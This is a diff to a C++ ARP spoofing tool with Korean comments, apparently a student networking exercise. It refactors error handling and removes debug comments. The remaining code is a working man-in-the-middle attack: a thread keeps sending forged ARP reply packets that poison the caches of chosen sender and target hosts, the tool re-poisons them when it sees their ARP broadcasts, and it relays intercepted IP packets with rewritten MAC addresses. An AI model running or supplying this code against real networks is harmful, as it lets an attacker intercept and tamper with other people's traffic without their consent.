@@ -13,6 +13,7 @@
 // thread
 #include <thread>
 #include <signal.h>
+#include <assert.h>
 // getMyIp
 #include <stdio.h>
 #include <unistd.h>
@@ -22,10 +23,8 @@
 #include <netinet/in.h>
 #include <net/if.h>
 //
-#include "common-threads.h"
 #define SUCCESS 1
 #define FAIL -1
-#define DEBUG 1
 
 
 #pragma pack(push, 1) 
@@ -59,7 +58,7 @@ std::vector <EthArpPacket> infectionPacket; // IpTable하고 매칭되도록 ind
 
 
 void sigint_handler(int signo) {
-	printf("sigint!!\n");
+	printf("\ninterrupt\n");
 	if(exit_flag == 0) exit(-1); // ctrl+c  2번하면 강제 종료
 	else exit_flag = 0; // ctrl+c 1번하면 순차적으로 종료
 }
@@ -108,33 +107,26 @@ EthArpPacket fillPacket(Mac& smac1, Mac& dmac, Mac& smac2, Ip& sip, Mac& tmac, I
 	return packet;
 }
 
-void sendARP(EthArpPacket packet, pcap_t* handle, int times, uint64_t usec) {
-	// 쓰레드 취소 요청에 대한 처리
-	//pthread_setcancelstate(PTHREAD_CANCEL_ENABLE, NULL);
-	//pthread_setcanceltype(PTHREAD_CANCEL_ASYNCHRONOUS,NULL);
+int sendARP(EthArpPacket packet, pcap_t* handle, int times, uint64_t usec) {
 
 	for(int i = 0; i < times; i++) {
-		// critical section??
 		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
-		
-		
-		//
-
+	
 		if (res != 0) {
 			fprintf(stderr, "pcap_sendpacket return %d error=%s times=%d\n", res, pcap_geterr(handle), times);
-			return;
+			return FAIL;
 		}
 
-		usleep(usec); // 마지막에는 필요 없는데 어케 해결할까 1. if  2. ??
+		if(i != times-1) usleep(usec); // 마지막에는 sleep 안함
 	}
-	return;
+	return SUCCESS;
 }
 
 int resolveMac(pcap_t* handle, map<Ip, Mac>& table, Ip& sip, Ip& tip) {
 	// table에 있는지 확인
 	if(table.find(tip) != table.end()) return SUCCESS;
 
-	EthArpPacket send_packet = fillPacket(table.find(sip)->second, Mac::broadcastMac(), table.find(sip)->second, sip, Mac::nullMac(), tip, ArpHdr::Request);
+	EthArpPacket send_packet = fillPacket(table[sip], Mac::broadcastMac(), table[sip], sip, Mac::nullMac(), tip, ArpHdr::Request);
 	
 	struct pcap_pkthdr* pkheader;
 	const u_char* packet;
@@ -186,9 +178,6 @@ int resolveMac(pcap_t* handle, map<Ip, Mac>& table, Ip& sip, Ip& tip) {
 		table.insert({ntohl(receive_packet.arp_.sip_), receive_packet.arp_.smac_});
 		break;
 	}
-	#ifdef DEBUG
-	cout << "resolve end" << endl;
-	#endif
 	return SUCCESS;
 }
 
@@ -221,40 +210,36 @@ int getMyInfo(char* dev, map<Ip, Mac>& table) {
 	return SUCCESS;
 }
 
-void recover(pcap_t* handle, map<Ip, Mac> table, Ip sender, Ip target) {
-	sendARP(fillPacket(table[target], table[sender], table[target], target, table[sender], sender, ArpHdr::Reply), handle, 3, 500);
+int recover(pcap_t* handle, map<Ip, Mac> table, Ip sender, Ip target) {
+	return sendARP(fillPacket(table[target], table[sender], table[target], target, table[sender], sender, ArpHdr::Reply), handle, 3, 500);
 }
 
 // 쓰레드용
 void *infection(void* handle) {
 	pthread_setcancelstate(PTHREAD_CANCEL_ENABLE, NULL);
 	pthread_setcanceltype(PTHREAD_CANCEL_ASYNCHRONOUS,NULL);
-	while(exit_flag) {
+	while(1) {
 		for(auto i : infectionPacket) {
 			sendARP(i, (pcap_t *)handle , 1, 0);
 			usleep(500); // packet loss? 때문에
 		}
 		sleep(10);
 	}
+	return NULL;
 }
 
-void watchPacket(pcap_t* handle, map<Ip, Mac>& ARPtable, vector<pair<Ip, Ip>>& IpTable, Ip& me) {
-	#ifdef DEBUG
-	cout << "watch!" << endl;
-	#endif
+int watchPacket(pcap_t* handle, map<Ip, Mac>& ARPtable, vector<pair<Ip, Ip>>& IpTable, Ip& me) {
 	struct pcap_pkthdr* pkheader;
 	const u_char* packet;
 
-
 	while (exit_flag) {
 	
-		// critical section
 		int res = pcap_next_ex(handle, &pkheader, &packet);
-		//
+		
 		if (res == 0) continue;
 		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
 			fprintf(stderr, "pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
-			return;
+			return FAIL;
 		}
 
 		EthHdr ethHeader;
@@ -263,8 +248,6 @@ void watchPacket(pcap_t* handle, map<Ip, Mac>& ARPtable, vector<pair<Ip, Ip>>& I
 		// IP 패킷인지 ARP인지
 		// => ETH의 type정보를 확인
 		if(ethHeader.type_ == htons(EthHdr::Ip4)) {
-			//cout << string(header.eth_.smac_) << ' ' << string(header.eth_.dmac_) << endl;
-			// flow를 해야하는지 확인
 
 			// IP헤더에서 sip랑 dip만 필요함.
 			Ip sip, dip;
@@ -275,69 +258,30 @@ void watchPacket(pcap_t* handle, map<Ip, Mac>& ARPtable, vector<pair<Ip, Ip>>& I
 
 			for(auto i : IpTable) {
 				// smac이 sender인지
-				if(ethHeader.smac_ == ARPtable[i.first] && ethHeader.dmac_ == ARPtable[me]) {
-					
-					// case 1: 내 자신(본인이 target일 경우)한테 오는 패킷을 나한테 또 전달할 필요는 없음.
-					// continue하면 될듯
-					//if(i.second == me) continue; // 내가 target
-					//if(htonl(dip) == me) continue; // 패킷 dest ip가 나
-					
-					// case 2: {sender, target}의 중복
-					// ex) ./arp-spoof enp0s3 192.168.0.1 192.168.0.7 192.168.0.1 192.168.0.7
-					// resolve에서 해결했음.
+				if(ethHeader.smac_ == ARPtable[i.first]) {
 
-					// case 3: sender == target 인 경우 
-					// ex) ./arp-spoof enp0s3 192.168.0.1 192.168.0.1
-					// ????
-
-					// case 4: sender가 중복 될수도 target이 중복될 수도 있음
-					// relay 이후에 break하지 말고 continue해야 함. -> 이미 구현되어 있음
-
-					// case 5: sender가 me인 경우
-					// 본인이 이미 감염되어 있기 때문에 패킷을 target한테 보냄.
-					// relay할 필요가 없음.
-					// ???
-					//if(i.first == me) continue;
-
-					// case 6: 
-					// ex)  /arp-spoof A B B A A C C A
-					/*
-
-					패킷 relay는
-					A <-> me <-> B(gateway)
-					A <-> me <-> C(user) // 이러면 ip로 판단해야할듯
-					*/
-
-
-					// relay할 때는
-
-					// src mac me로 바꿔서 보냄
-					// dst mac 을 target꺼로
+					if(htonl(dip) == me) continue; // 패킷 dest ip가 나
+					// 나한테 온걸 나한테 재전송 xx
 
 					u_char* paste_packet = (u_char*)calloc(1, pkheader->len +1);
 
 					memcpy(paste_packet, packet, pkheader->len);
 					Mac myMac = ARPtable[me];
 					memcpy(paste_packet+6, &myMac, 6);
-					Mac tMac = ARPtable[i.second]; // A <-> B랑   A <-> C  감염되었으면 어케 판별?
+					Mac tMac = ARPtable[i.second];
 					memcpy(paste_packet, &tMac, 6);
 
-					// critical section
 					int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(paste_packet), pkheader->len + 1);
-					//
-
+					
 					free(paste_packet);
 
 					if (res != 0) {
 						fprintf(stderr, "pcap_sendpacket return %d error=%s len=%d\n", res, pcap_geterr(handle), pkheader->len);
-						free(paste_packet);
-						return;
+						return FAIL;
 					}
-					
 					//break;
 				}
 			}
-
 			continue;
 		}
 		
@@ -346,61 +290,37 @@ void watchPacket(pcap_t* handle, map<Ip, Mac>& ARPtable, vector<pair<Ip, Ip>>& I
 
 		EthArpPacket header;
 		memcpy(&header, packet, sizeof(EthArpPacket));
-
-
  
-		// case 1: target이 본인이면
-		// arp 감염할 필요가 없다.
-					
-		// case 2: {sender, target}의 중복
-		// ex) ./arp-spoof enp0s3 192.168.0.1 192.168.0.7 192.168.0.1 192.168.0.7
-		// resolve에서 해결했음.
-
-		// case 3: sender == target 인 경우 
-		// ex) ./arp-spoof enp0s3 192.168.0.1 192.168.0.1
-		// ???? 공격이 의미가 있을까?
-		// 본인 mac주소는 ARP Table을 이용하는지? => 일단은 아닌거 같음
-
-		// case 4: sender가 중복 될수도 target이 중복될 수도 있음
-		// relay 이후에 break하지 말고 continue해야 함. -> 이미 구현되어 있음
-
-		// case 5: sender가 me인 경우
-		// 본인이 이미 감염되어 있기 때문에 패킷을 target한테 보냄.
-		// ex) ./arp-spoof enp0s3 192.168.0.7 192.168.0.1
-		// 본인의 ARP table을 본인에게 망가트리도록 조정함
-		// 의미가 잇을까?
-
-		// case 6: 
-		// ex) 
 
 
-		// network byte order <-> host byte order
-		cout << "this packet is ARP" << endl;
+		//cout << "this packet is ARP" << endl;
 		// broadcast인지 
-		cout << ntohl(header.arp_.sip_) << ' ' << ntohl(header.arp_.tip_) << endl;
 		if(header.eth_.dmac_ == Mac::broadcastMac()) { // broadcast인지부터 확인
 			for(int i = 0; i < IpTable.size(); i++) {
+				// network byte order <-> host byte order
 				// 1. sender의 target에 대한 broadcast
 				if(ntohl(header.arp_.sip_) == uint32_t(IpTable[i].first) && ntohl(header.arp_.tip_) == uint32_t(IpTable[i].second)) {
-					cout << "case 1" << endl;
-					sendARP(infectionPacket[i], handle, 2, 500);
+					//cout << "case 1" << endl;
+					if(sendARP(infectionPacket[i], handle, 2, 500) == FAIL) return FAIL;
 				}
 
 				// 2. target의 broadcast
 				if(ntohl(header.arp_.sip_) == uint32_t(IpTable[i].second)) {
-					cout << "case 2" << endl;
-					sendARP(infectionPacket[i], handle, 2, 500);
+					//cout << "case 2" << endl;
+					if(sendARP(infectionPacket[i], handle, 2, 500) == FAIL) return FAIL;
 				}
 			}
 
 		}
 		// unicast인지
+		// 어차피 패킷이 나한테 오기 때문에 
+		// relay 안하면 상관없음.
 		else {
 			for(int i = 0 ; i < IpTable.size(); i++) {
 				// 3. sender -> target unicast
-				if(header.arp_.sip_ == IpTable[i].first && header.arp_.tip_ == IpTable[i].second) {
-					cout << "case 3" << endl;
-					sendARP(infectionPacket[i], handle, 2, 500);
+				if(ntohl(header.arp_.sip_) == IpTable[i].first && ntohl(header.arp_.tip_) == IpTable[i].second) {
+					//cout << "case 3" << endl;
+					//sendARP(infectionPacket[i], handle, 2, 500);
 				}
 			}
 			
@@ -408,14 +328,13 @@ void watchPacket(pcap_t* handle, map<Ip, Mac>& ARPtable, vector<pair<Ip, Ip>>& I
 
 		// 4. target -> sender unicast => 인자를 2쌍 이상 받아서 처리하는 이유
 		// target sender 둘다 감염 시키면 
-		// 4에 해당하는 것이 3번 경우에 잡힙
+		// 4에 해당하는 것이 case 3에 잡힙
 		// 어차피 arp는 relay하지 않기 때문에 sender한테 unicast 전달이 안됨.
 	}
-
+	return SUCCESS;
 }
 
 void initArg(char* argv[], Ip& sender, Ip& target) {
 	sender = Ip(string(argv[0]));
 	target = Ip(string(argv[1]));
 }
-
